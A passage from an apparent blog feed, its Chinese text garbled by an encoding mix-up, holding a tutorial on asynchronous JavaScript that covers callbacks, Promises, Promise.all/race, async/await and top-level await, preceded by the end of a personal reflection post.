”ç©¶å¹¶ä¸åˆ»æ„åšæ·±å…¥äº†è§£ã€‚</p><p>ä¹Ÿå¸Œæœ›è¿™å­¦æœŸè‡ªå·±èƒ½å¤ŸçœŸæ­£çš„åšå›è‡ªå·±ï¼Œä¸è¦è€æ˜¯æå†…å·è®©åˆ«äººå¿ƒæ…Œï¼Œä¹Ÿä¸è¦çœ‹è§åˆ«äººå†…å·è‡ªå·±å°±å¿ƒæ…Œã€‚<em><strong>æ²¡æœ‰æ„ä¹‰ï¼Œåˆ«äººçš„ä¸æ˜¯æˆ‘çš„ï¼Œæˆ‘ä¹Ÿä¸éœ€è¦æ¯”åˆ«äººå‰å®³ï¼Œæˆ‘åªéœ€å…³æ³¨è‡ªå·±çš„è¿›æ­¥ï¼Œè·Ÿç€è‡ªå·±çš„æ­¥è°ƒå‰è¿›å°±å¥½äº†</strong></em>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> äººç”Ÿæ„Ÿæ‚Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äººç”Ÿæ„Ÿæ‚Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹å¼‚æ­¥æ¦‚å¿µä¸Šçš„ç†è§£ä»¥åŠJavaScriptå¼‚æ­¥æ“ä½œå®ç°æ–¹å¼</title>
      <link href="/2022/09/03/async-javascript/"/>
      <url>/2022/09/03/async-javascript/</url>
      
        <content type="html"><![CDATA[<h1 id="å¯¹å¼‚æ­¥æ¦‚å¿µä¸Šçš„ç†è§£"><a href="#å¯¹å¼‚æ­¥æ¦‚å¿µä¸Šçš„ç†è§£" class="headerlink" title="å¯¹å¼‚æ­¥æ¦‚å¿µä¸Šçš„ç†è§£"></a>å¯¹å¼‚æ­¥æ¦‚å¿µä¸Šçš„ç†è§£</h1><blockquote><p>å¯¹å¼‚æ­¥è¿™ä¸ªå•è¯æˆ‘æ—©å·²ä¸é™Œç”Ÿäº†ï¼Œä»å»å¹´å¼€å§‹åšbukkitå¼€å‘å¼€å§‹å°±ä¸€ç›´åœ¨æ¥è§¦è¿™ä¸ªè¯ã€‚ç„¶è€Œæˆ‘å´ä»æ¥æ²¡æœ‰çœŸæ­£ç†è§£è¿‡å¼‚æ­¥çš„å«ä¹‰ï¼Œä¹‹å‰æˆ‘å®é™…ä¸Šæ˜¯æŠŠå¤šçº¿ç¨‹ä¸å¼‚æ­¥æ··æ·†äº†ã€‚å¼‚æ­¥æ“ä½œå®é™…ä¸Šæ˜¯å®Œå…¨å¯ä»¥åœ¨å•çº¿ç¨‹ä¸Šæ‰§è¡Œçš„</p></blockquote><h2 id="ä»€ä¹ˆæ˜¯å¼‚æ­¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å¼‚æ­¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å¼‚æ­¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å¼‚æ­¥ï¼Ÿ</h2><p>å¾ˆç®€å•ï¼Œæ­£æ‰€è°“<strong>è¿ç»­</strong>çš„æ“ä½œå°±å«<strong>åŒæ­¥</strong>ï¼Œ<strong>ä¸è¿ç»­</strong>çš„æ“ä½œå°±å«<strong>å¼‚æ­¥</strong>ã€‚</p><p>è¿™æ ·ä¸€çœ‹ï¼Œå°±å¾ˆå¥½ç†è§£äº†ã€‚åœ¨å¤šçº¿ç¨‹çš„æ‰§è¡Œç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªå­çº¿ç¨‹ï¼Œè¿™ä¸ªå­çº¿ç¨‹æ˜¯<strong>ä¸²è¡Œ</strong>æ‰§è¡Œçš„ï¼Œè‡ªç„¶æ˜¯ä¸è¿ç»­çš„ã€‚</p><p>é‚£ä¹ˆå•çº¿ç¨‹ä¸­çš„å¼‚æ­¥æ“ä½œæ—¶æ€ä¹ˆå®ç°çš„ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ï¼Œå…ˆæ‰§è¡Œå®ŒåŒæ­¥ä»£ç ï¼Œæœ€åé€ä¸ªæ‰§è¡Œå¼‚æ­¥é˜Ÿåˆ—ä¸­çš„å›è°ƒå‡½æ•°ã€‚</p><p>ä¾‹å¦‚javascriptä¸­çš„å¼‚æ­¥ ï¼ˆå•çº¿ç¨‹ï¼‰</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token comment">// æœ€åæ‰§è¡Œ</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>   <span class="token comment">// æ“ä½œ</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"World"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºç»“æœ:</p><pre class="line-numbers language-none"><code class="language-none">HelloWorldHello World<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="JavaScriptä¸­çš„å¼‚æ­¥å®ç°æ–¹å¼"><a href="#JavaScriptä¸­çš„å¼‚æ­¥å®ç°æ–¹å¼" class="headerlink" title="JavaScriptä¸­çš„å¼‚æ­¥å®ç°æ–¹å¼"></a>JavaScriptä¸­çš„å¼‚æ­¥å®ç°æ–¹å¼</h2><blockquote><p>JavaScriptä¸­çš„å¼‚æ­¥é™¤äº†Web Workerå‡ä¸ºå•çº¿ç¨‹å®ç°</p></blockquote><h3 id="å›è°ƒ"><a href="#å›è°ƒ" class="headerlink" title="å›è°ƒ"></a>å›è°ƒ</h3><p>å°å¿ƒ<strong>å›è°ƒåœ°ç‹±</strong></p><p>å›è°ƒå‡½æ•°ä¸æ–­åµŒå¥—ï¼Œå¯¼è‡´ä»£ç å¯è¯»æ€§å¤§å¹…ä¸‹é™</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"è¶…å“¥èµ·åºŠ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>è¶…å“¥ç¡å›ç¬¼è§‰<span class="token operator">==</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>"è¶…å“¥å›åˆ°åºŠä¸Šè¶…å“¥ç¡è§‰<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">(</span>è¶…å“¥ç¡å›ç¬¼è§‰<span class="token operator">==</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"è¶…å“¥åˆ·ç‰™"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"è¶…å“¥æ´—è„¸"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        è¶…å“¥ä¸Šå•æ‰€<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h3><blockquote><p>Promiseæœ¬æ„æ˜¯æ‰¿è¯ºï¼Œåœ¨ç¨‹åºä¸­çš„æ„æ€å°±æ˜¯æ‰¿è¯ºæˆ‘è¿‡ä¸€æ®µæ—¶é—´åä¼šç»™ä½ ä¸€ä¸ªç»“æœã€‚ ä»€ä¹ˆæ—¶å€™ä¼šç”¨åˆ°è¿‡ä¸€æ®µæ—¶é—´ï¼Ÿç­”æ¡ˆæ˜¯å¼‚æ­¥æ“ä½œï¼Œå¼‚æ­¥æ˜¯æŒ‡å¯èƒ½æ¯”è¾ƒé•¿æ—¶é—´æ‰æœ‰ç»“æœçš„æ‰åšï¼Œä¾‹å¦‚ç½‘ç»œè¯·æ±‚ã€è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰</p></blockquote><p>ä½¿ç”¨Promiseè¿›è¡Œå¼‚æ­¥æ“ä½œä¼šæé«˜ä»£ç å¯è¯»æ€§ ï¼ˆæ‘†è„±å›è°ƒåœ°ç‹±ï¼‰</p><h4 id="then-catch-é“¾å¼è°ƒç”¨"><a href="#then-catch-é“¾å¼è°ƒç”¨" class="headerlink" title="then/catch é“¾å¼è°ƒç”¨"></a>then/catch é“¾å¼è°ƒç”¨</h4><p>ç”¨æ³•ç±»ä¼¼Javaçš„CompletableFutureï¼Œè¿›è¡Œé“¾å¼è°ƒç”¨ï¼Œå¯ä»¥ä¼ å‚ã€‚</p><p>ä¸ä¸€æ ·çš„æ˜¯å¤šäº†ä¸€ä¸ªå¼‚å¸¸å¤„ç†çš„å›è°ƒï¼Œä¸ªäººæ„Ÿè§‰æ¯”CompletableFutureå¥½ä½¿ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">//åšä¸€äº›å¼‚æ­¥æ“ä½œ</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ‰§è¡Œå®Œæˆ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> ï¼ˆæˆ‘æ‰¾åˆ°å¯¹è±¡äº†<span class="token operator">==</span><span class="token boolean">true</span><span class="token function">ï¼‰resolve</span><span class="token punctuation">(</span><span class="token string">"å¥½è€¶"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">else</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">"ä¹Ÿè®¸ä½ å¯ä»¥æŠŠæ ‡å‡†æ”¾å¼€ä¸€ç‚¹"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">return</span> data     <span class="token comment">//æ­¤æ—¶è¾“å‡ºdataä¸ºresolveä¼ å…¥çš„å‚æ•°</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>     <span class="token comment">//æ­¤æ—¶è¾“å‡ºerrorä¸ºrejectä¼ å…¥çš„å‚æ•°</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>   <span class="token keyword">return</span> data    <span class="token comment">//å¥½è€¶</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>   <span class="token comment">//å¥½è€¶</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>   <span class="token comment">//undefined</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="all-race-å¤šä¸ªå¼‚æ­¥æ“ä½œçš„åŒæ­¥å¤„ç†"><a href="#all-race-å¤šä¸ªå¼‚æ­¥æ“ä½œçš„åŒæ­¥å¤„ç†" class="headerlink" title="all/race å¤šä¸ªå¼‚æ­¥æ“ä½œçš„åŒæ­¥å¤„ç†"></a>all/race å¤šä¸ªå¼‚æ­¥æ“ä½œçš„åŒæ­¥å¤„ç†</h4><ul><li><p>all å…¨éƒ¨ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åæ‰§è¡Œä¸‹ä¸€ä¸ªä»»åŠ¡</p><blockquote><p>Promiseçš„allæ–¹æ³•æä¾›äº†å¹¶è¡Œæ‰§è¡Œå¼‚æ­¥æ“ä½œçš„èƒ½åŠ›ï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰å¼‚æ­¥æ“ä½œæ‰§è¡Œå®Œåæ‰æ‰§è¡Œå›è°ƒã€‚</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> Promise1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> Promise2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> Promise3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>Promise1<span class="token punctuation">,</span> Promise2<span class="token punctuation">,</span> Promise3<span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token function">funciton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// ä¸‰ä¸ªéƒ½æˆåŠŸåˆ™æˆåŠŸ  </span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// åªè¦æœ‰å¤±è´¥ï¼Œåˆ™å¤±è´¥ </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>race å¤šä¸ªä»»åŠ¡è¿›è¡Œæ¯”èµ›</p><p><em><strong>æˆ‘é€‰æ‹©æœ€å¿«çš„é‚£ä¸ªï¼</strong></em></p><blockquote><p>raceæ–¹æ³•ä¼ å…¥å¤šä¸ªpromiseå‚æ•°ï¼Œè¿”å›å€¼ä¸ºå…¶ä¸­æœ€å¿«æ‰§è¡Œå®Œæˆçš„promise</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//è¯·æ±‚æŸä¸ªå›¾ç‰‡èµ„æº</span>   <span class="token keyword">function</span> <span class="token function">requestImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>           <span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           img<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token function">resolve</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'å›¾ç‰‡çš„è·¯å¾„'</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> p<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token comment">//å»¶æ—¶å‡½æ•°ï¼Œç”¨äºç»™è¯·æ±‚è®¡æ—¶</span>   <span class="token keyword">function</span> <span class="token function">timeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>           <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>               <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'å›¾ç‰‡è¯·æ±‚è¶…æ—¶'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> p<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">requestImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">timeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span><span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h3><p>å®é™…ä¸Šä»–ä»¬æ˜¯åŸºäºpromiseå®ç°çš„ï¼Œå®ƒä»¬çš„ä½œç”¨å°±æ˜¯è®©ä½ å¼‚æ­¥æ‰§è¡Œçš„ä»£ç åŒæ­¥</p><blockquote><p>asyncç”¨æ¥ä¿®é¥°ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨asyncä¿®é¥°çš„æ–¹æ³•ä¸­å¯ä»¥ä½¿ç”¨awaitæ¥ä¿®é¥°ä¸€ä¸ªæ–¹æ³•çš„è°ƒç”¨ã€‚</p><p>æœ‰ç‚¹ç±»ä¼¼äºkotlinåç¨‹ä¸­çš„suspend æŒ‚èµ·å‡½æ•° ä¸ Deffered#awaitæ–¹æ³•</p><p>ä½†jså¯æ²¡æœ‰ä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿçš„åç¨‹ä½œç”¨åŸŸå’Œä¸Šä¸‹æ–‡ï¼Œæ¯•ç«Ÿè¿™äº›å®é™…ä¸Šéƒ½æ˜¯åœ¨å•çº¿ç¨‹ç¯å¢ƒä¸‹è¿è¡Œçš„</p></blockquote><p><strong>ä¸¾ä¸ªæ —å­</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// awaitä¿®é¥°ç¬¦åªèƒ½å½±å“åƒè¿™æ ·è¿”å›ä¸€ä¸ªpromiseçš„å‡½æ•°å’Œè¢«asyncä¿®é¥°çš„å‡½æ•°</span><span class="token keyword">const</span> <span class="token function-variable function">step</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">size<span class="token punctuation">,</span> time<span class="token punctuation">,</span> ele</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>            ele<span class="token punctuation">.</span>style<span class="token punctuation">.</span>marginLeft <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>size<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">px</span><span class="token template-punctuation string">`</span></span>            <span class="token function">resolve</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// è¿™é‡Œawaitä¼šè®©åŸæœ¬å¼‚æ­¥çš„æ–¹æ³•åŒæ­¥ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œstepæ–¹æ³•å½»åº•æ‰§è¡Œå®Œæ¯•æ‰ä¼šè¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">await</span> <span class="token function">step</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// é¡ºåºæ‰§è¡Œä»»åŠ¡é˜Ÿåˆ—</span><span class="token comment">// è®©å¼‚æ­¥é˜Ÿåˆ—åŒæ­¥æ‰§è¡Œ</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">awaitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">await</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token string">"one"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token string">"two"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">awaitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä¸€ç‚¹å°å½©è›‹"><a href="#ä¸€ç‚¹å°å½©è›‹" class="headerlink" title="ä¸€ç‚¹å°å½©è›‹"></a>ä¸€ç‚¹å°å½©è›‹</h4><h5 id="top-await"><a href="#top-await" class="headerlink" title="top await"></a>top await</h5><p>æ¥è‡ªè·¯å§å§çš„æŒ‡å¯¼ï¼ˆ</p><blockquote><p>åœ¨å¼•ç”¨æ—¶åŠ ä¸€ä¸²type=â€moduleâ€ </p><p>å¯ä»¥å¯¼å…¥JSæ¨¡å—ï¼ˆä¸‹å­¦æœŸå†…å®¹ï¼‰ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸€äº›å…¶ä»–JSçš„æ–°ç‰¹æ€§ï¼Œæ¯”å¦‚ top awaitï¼Œè¿™æ—¶ await å°±ä¸éœ€è¦æ”¾åœ¨ async å‡½æ•°é‡Œæ‰èƒ½æ‰§è¡Œäº†</p><p>è·¯å§çš„ä¼˜é›…ä»£ç  å½³äº</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>optimize/script.js<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token 